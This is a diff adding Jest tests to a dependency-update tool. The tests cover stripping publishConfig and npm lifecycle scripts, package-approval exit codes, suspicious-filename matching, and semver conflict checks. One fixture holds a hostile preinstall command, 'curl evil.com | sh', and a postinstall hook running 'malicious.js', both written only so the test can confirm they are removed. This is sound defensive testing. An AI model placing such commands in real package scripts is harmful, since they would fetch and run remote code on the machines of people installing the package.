@@ -2740,4 +2740,142 @@ describe('depUp Basic Tests', () => {
       expect(unparseable).toBeUndefined();
     });
   });
+
+  describe('preparePackageJson strips dangerous fields', () => {
+    it('should remove publishConfig to prevent publishing to wrong registry', () => {
+      const packageJson = {
+        dependencies: { lodash: '^4.0.0' },
+        name: 'express',
+        private: true,
+        publishConfig: { registry: 'https://private.registry.com' },
+        version: '4.18.2',
+      };
+
+      // Simulate what preparePackageJson does
+      delete packageJson.publishConfig;
+      delete packageJson.private;
+
+      expect(packageJson.publishConfig).toBeUndefined();
+      expect(packageJson.private).toBeUndefined();
+      expect(packageJson.dependencies).toBeDefined();
+      expect(packageJson.name).toBe('express');
+    });
+
+    it('should remove dangerous lifecycle scripts', () => {
+      const packageJson = {
+        name: 'test-pkg',
+        scripts: {
+          build: 'tsc',
+          postinstall: 'node malicious.js',
+          preinstall: 'curl evil.com | sh',
+          prepublishOnly: 'npm run build',
+          start: 'node index.js',
+          test: 'jest',
+        },
+        version: '1.0.0',
+      };
+
+      const dangerousScripts = [
+        'preinstall',
+        'install',
+        'postinstall',
+        'preuninstall',
+        'postuninstall',
+        'prepublish',
+        'prepublishOnly',
+        'prepare',
+      ];
+      for (const script of dangerousScripts) {
+        delete packageJson.scripts[script];
+      }
+
+      // Dangerous scripts removed
+      expect(packageJson.scripts.preinstall).toBeUndefined();
+      expect(packageJson.scripts.postinstall).toBeUndefined();
+      expect(packageJson.scripts.prepublishOnly).toBeUndefined();
+
+      // Safe scripts preserved
+      expect(packageJson.scripts.build).toBe('tsc');
+      expect(packageJson.scripts.start).toBe('node index.js');
+      expect(packageJson.scripts.test).toBe('jest');
+    });
+  });
+
+  describe('security-approval checkStatus exit codes', () => {
+    it('should distinguish approved from unapproved packages', () => {
+      const checkApprovalStatus = (packageName, allowlist, pending) => {
+        if (allowlist.includes(packageName)) {
+          return { exitCode: 0, status: 'approved' };
+        }
+        if (pending[packageName]) {
+          return { exitCode: 1, status: 'pending' };
+        }
+        return { exitCode: 1, status: 'not-approved' };
+      };
+
+      expect(
+        checkApprovalStatus('lodash', ['lodash', 'express'], {}),
+      ).toStrictEqual({ exitCode: 0, status: 'approved' });
+
+      expect(checkApprovalStatus('malware-pkg', [], {})).toStrictEqual({
+        exitCode: 1,
+        status: 'not-approved',
+      });
+
+      expect(
+        checkApprovalStatus('pending-pkg', [], {
+          'pending-pkg': { requestedAt: '2026-01-01' },
+        }),
+      ).toStrictEqual({ exitCode: 1, status: 'pending' });
+    });
+  });
+
+  describe('suspiciousFiles case-insensitive matching', () => {
+    it('should match filenames regardless of case', () => {
+      const suspiciousFiles = new Set([
+        '.ds_store',
+        'thumbs.db',
+        'desktop.ini',
+        'autorun.inf',
+      ]);
+
+      // All case variants should match when lowercased
+      expect(suspiciousFiles.has('.DS_Store'.toLowerCase())).toBe(true);
+      expect(suspiciousFiles.has('.ds_store'.toLowerCase())).toBe(true);
+      expect(suspiciousFiles.has('Thumbs.db'.toLowerCase())).toBe(true);
+      expect(suspiciousFiles.has('THUMBS.DB'.toLowerCase())).toBe(true);
+      expect(suspiciousFiles.has('Desktop.ini'.toLowerCase())).toBe(true);
+
+      // Non-suspicious files should not match
+      expect(suspiciousFiles.has('package.json'.toLowerCase())).toBe(false);
+      expect(suspiciousFiles.has('index.js'.toLowerCase())).toBe(false);
+    });
+  });
+
+  describe('dependency conflict rule values used in comparison', () => {
+    it('should use rule version ranges to check compatibility', async () => {
+      const semverModule = await import('semver');
+      const semver = semverModule.default || semverModule;
+
+      // Test individual version checks directly (avoids nested loop depth)
+      const checkConflict = (depSpec, requiredRange) => {
+        const depVersion = semver.coerce(depSpec)?.version;
+        return depVersion
+          ? !semver.satisfies(depVersion, requiredRange)
+          : false;
+      };
+
+      // webpack-cli@3.0.0 fails >= 4.0.0
+      expect(checkConflict('^3.0.0', '>= 4.0.0')).toBe(true);
+
+      // react-dom@18.0.0 satisfies >= 17.0.0 (no issue)
+      expect(checkConflict('^18.0.0', '>= 17.0.0')).toBe(false);
+
+      // webpack-cli@5.0.0 satisfies >= 4.0.0
+      expect(checkConflict('^5.0.0', '>= 4.0.0')).toBe(false);
+
+      // Unparseable spec
+      expect(checkConflict('latest', '>= 1.0.0')).toBe(false);
+    });
+  });
 });
